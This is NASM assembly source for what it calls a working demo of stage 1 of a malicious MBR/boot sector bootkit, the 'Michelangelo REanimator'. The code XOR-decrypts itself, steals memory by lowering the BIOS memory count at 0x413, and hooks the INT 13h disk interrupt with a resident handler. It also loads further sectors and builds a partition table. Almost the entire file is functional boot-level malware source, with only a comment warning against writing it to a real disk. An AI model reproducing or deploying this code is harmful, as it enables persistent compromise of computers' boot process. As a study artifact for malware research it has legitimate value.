[bits 16]
;.286			;masm specific
;.MODEL TINY		;masm specific


;******************************************************************************
;	This is the working demo of stage 1 of the malicious MBR/boot sector
; 	of the Michelangelo REanimator bootkit
;	
;	Use at your own risk. 
;	*Plz dont dd your primary hd partition with this. 
;	This is a functional boot sector that will hang once it hits the 
;	last function
;	It was written as a way to test the graphics functionality of my
;	Michelangelo REanimator project
;	There is no functionality in this boot sector to jump to a loaded
; 	valid MBR, or to a valid boot sector
;		
;	To assemble (with nasm):
;	nasm -f bin -o michelange_grafx_routines.mbr michelange_grafx_routines.mbr
;	
;	To run;
;	qemu-system-i386 -m 16 -rtc base=localtime -device cirrus-vga -display gtk -hda dos_rip.img 
;	Note: the -rtc -device and -display flag values are all based on what 
;   I've used on my own machine as configurations that work well for my use cases.  
;   You may need to adjust them as needed for your own host machine and 
;   what you have installed.
;	To run in a debug session with GDB attached:
;	qemu-system-i386 -m 16 -rtc base=localtime -device cirrus-vga -display gtk -hda dos_rip.img -s -S
;	(see debugging notes for details on setup of GDBi/Bochs session) 
;
;
;******************************************************************************

.CODE:
org 0x7C00

;******************************************************************************
;SCREEN_WIDTH		equ	0x140							;;320
;SCALED_SCREEN_MAX	equ SCALED_SCREEN_W*SCALED_SCREEN_H
;SCALED_SCREEN_W		equ	0x20*SCALE_MULTIPLIER			;;320 / 10
;SCALED_SCREEN_H		equ	0x14*SCALE_MULTIPLIER			;;200 / 10 
;OFFSET_SCREEN_H		equ SCALED_SCREEN_H*SCREEN_WIDTH
;SECTOR_SIZE			equ 0x200
;SCALE_MULTIPLIER	equ 4
SCREEN_MAX			equ 320*100

VGA_PAL_INDEX		equ	0x3C8
VGA_PAL_DATA		equ	0x3C9
;******************************************************************************
VX_BOOT:
cli
cld
xor 	ax,ax
mov 	ds,ax
mov 	es,ax
mov 	ss,ax
mov		ax, 0x7c00
mov		sp, ax
sti

;cmp byte [load_vx_paint], 0x78
;xchg bx,bx
;je $load_vx_paint+4

crypt:
	push cs
	pop es
	push cs
	pop ds
;	lea si, load_vx_paint
;	lea di, load_vx_paint
	lea si, signature
	lea di, signature
	mov cx, cryptlen 
	crypt_loop:
		lodsb
		xor al, 12h
		stosb
		loop crypt_loop
	jmp $load_vx_paint
	
	signature:
	db 0x78,0x6f,0x78,0x6f
	

old_INT:
db	0EAh			;from Spanska Elvira, EAh is far call
_ORIG_INT	dd	? 	;this is also such a nice trick bc it avoids having to define these in a data segment
iret				;so there is no need to change the segment for loading cs w the correct value


tsr_hook_int:
	cmp	ah, 0x2
	jne 	NO_INT
	pushf

NEW_INT:
	push 	ax
	push 	bx
	push	dx
	push	ds
	push	es
	push	si
	push	di
	
	;;do things here for new ISR xoxo
	cli
	vga_init:
		mov	ax, 0013h
		int	10h
		mov	ax,0xA000
		mov	es,ax
		mov	ds,ax
		mov	di,0
		mov	ax,0202h
		cld
		int13_message:
			rsvp:
				mov cx, int13greetz_len
				mov si, int13greetz
			message:
				push cs
				pop ds
			welcome:
				mov al, ds:[si]
				mov bh, 0x0
				mov bl, 0x0a
				mov ah, 0x0E
				int 0x10
				inc si
				dec cx
				jnz welcome

	cmp cx, 0x1
	jne $+3
	mov cx, 0x3
	sti
	pop di
	pop	si
	pop	es
	pop	ds
	pop	dx
	pop	bx
	pop	ax
	popf

NO_INT:
	push	ax
	mov	al, 0x20
	out	0x20, al
	pop	ax
	jmp 	old_INT




load_vx_paint:
	mov ax, 0x0		;reset disk
	int 13h

load_OG_mbr:
	mov ax, 0x201	;read one sectors of disk
	mov ch, 0		;retrieve OG MBR
	mov cl, 3		;cylinder 0, sector 3 
	mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
	mov bx, 0x200
	int 13h
	

	push cs
	pop es
	push cs
	pop ds
	mov [DefaultDisk], dl
	mov ax, 0x0900
	mov es, ax
	mov ds, ax

	mov cx, 0x1500
	push cx
	
	xor di, di
	xor si, si

	read_sector:
		mov ax, 0x215	;read twenty one sectors of disk
		mov ch, 0
		mov cl, 0xD		;cylinder 0, sector 13 
		mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
;		mov dl, [DefaultDisk]
		mov bx, 0x400
		int 13h
		
	pop cx

	copy_sector_loop:
		mov word ax, [bx]
		stosw
		;mov word [es:di], ax
		add bx,2
		dec cx
		cmp cx, 0
		jnz copy_sector_loop
	;cmp byte [copy_replay], 0x0
	;jz idontplaytagb
	cmp byte [copy_replay], 0x2
	jz copy_OG_MBR
	jmp idontplaytagb

;copy_vx_MBR:	
;;	xchg bx, bx
;	push cs						;copy the code here (the viral MBR) 
;	pop es						;to address 0000:0x600
;	mov di, 0x600				;this is typical MBR behavior
;	mov bx, VX_BOOT ;ax=VXBOOT
;;	;xor si, si
;	mov byte [copy_replay], 0x1
;;	xchg bx, bx
;	mov cx, 0x100
;	jmp copy_sector_loop	
;
;	;copy original MBR to this address 0000:0x7c00
;	;

copy_OG_MBR:
;	;mov ax, 0x07c0
	xor ax, ax
	mov es, ax				;classic bootkit technique for stealing mem
	mov ax, es:[0x413] 		;BPB internal memory block count
	dec ax					; steal 2k for virus
	dec ax					; tbd on size adjustments for now
	mov  es:[0x413], ax		;store new altered num freee blocks back in BPB param
	mov cl, 6				;again I don't know why the convention is to mov cl, 6
	shl ax, cl				; and then shift ax by cl
	mov es, ax				; rather than shl ax, 6
	mov [highmem_segment], es	; but whatever, following classic bootkit convention for the mo
;	;mov ds, ax
	
	push cs
	pop es
	mov di, 0x7C00				;this is typical MBR behavior
;	;mov di, 0x7E00				;this is typical MBR behavior
	mov bx, 0x200
;	xor di, di
	mov byte [copy_replay], 0x0
	mov cx, 0x100
	jmp copy_sector_loop	

idontplaytagb:
	jmp 	setup_hook_interrupts

setup_hook_interrupts:
	push es	
	mov	ax,0
	mov	es, ax
	es 	les bx,[0x4C]			;;for int 13h
						;;es:bx contains contents of address 0x4C (0000:004C)
	mov	[_ORIG_INT], bx
	mov	[_ORIG_INT+2], es

	
	mov es, [highmem_segment]
	;push cs
	;pop es
	mov dx, tsr_hook_int
	mov [0x4C], dx
	mov [0x4E], es
	pop es


	
	jmp boot2nd:0

;sector_num equ sector_count+num_sectors

DefaultDisk:
	db 0x80

boot2nd equ 0x900
cryptlen equ $-crypt

copy_replay:
	db 0x2

highmem_segment:
	db 0x0

int13greetz:
	db "hello from ur new int13 handler", 0Dh, 0Ah
	db "xoxo", 0Dh, 0Ah
	db "ic3qu33n", 0Dh, 0Ah
int13greetz_len	equ $-int13greetz


partition_start:	
	times 0x1BE-($-$$) db 0

driverrollupthepartitionplz:
db 0x80, 0x01, 0x01, 0x00, 0x06, 0x1f, 0xbf, 0x08, 0x3f, 0x00, 0x00, 0x00, 0xc1, 0xfe, 0x0f, 0x00
db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00

VXend:
	db 0x55
	db 0xAA

